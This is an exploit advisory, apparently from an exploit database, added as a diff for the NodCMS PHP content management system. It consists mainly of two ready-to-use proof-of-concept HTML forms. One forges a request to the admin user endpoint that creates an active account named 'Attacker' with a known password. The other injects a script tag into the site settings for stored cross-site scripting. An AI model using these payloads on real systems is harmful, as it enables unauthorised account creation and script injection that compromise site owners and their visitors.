@@ -1,0 +1,42 @@
+# Exploit Title :              nodcms Cross Site Request Forgery
+# Author :                     Ashiyane Digital Security Team
+# Google Dork :                 -
+# Date :                       29/10/2016
+# Type :                       webapps
+# Platform :                   PHP
+# Vendor Homepage :  http://www.nodcms.com/en
+ Software link :
+  https://github.com/khodakhah/nodcms/archive/master.zip
+
+
+
+########################### CSRF PoC ###############################
+# create User: username=Attacker & password=123456
+
+<html>
+  <!-- CSRF PoC  -->
+  <body>
+    <form name="form0" action="http://SiteName/admin/user_manipulate" method="POST">
+      <input type="hidden" name="data[username]" value="Attacker" />
+      <input type="hidden" name="data[email]" value="Attacker@attacker.com" />
+      <input type="hidden" name="data[fullname]" value="Atacker" />
+      <input type="hidden" name="data[password]" value="123456" />
+      <input type="hidden" name="data[status]" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+####################################################################
+ # CSRF/Xss
+<html>
+  <!-- CSRF PoC  -->
+  <body>
+    <form name="form1" action="http://sitename/admin/settings/generall" method="POST">
+      <input type="hidden" name="data[language_id]" value="1" />
+      <input type="hidden" name="data[company]" value="<script>alert(/xss/)</script>" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+####################################################################
+#-# Discovered by : Amir.ght
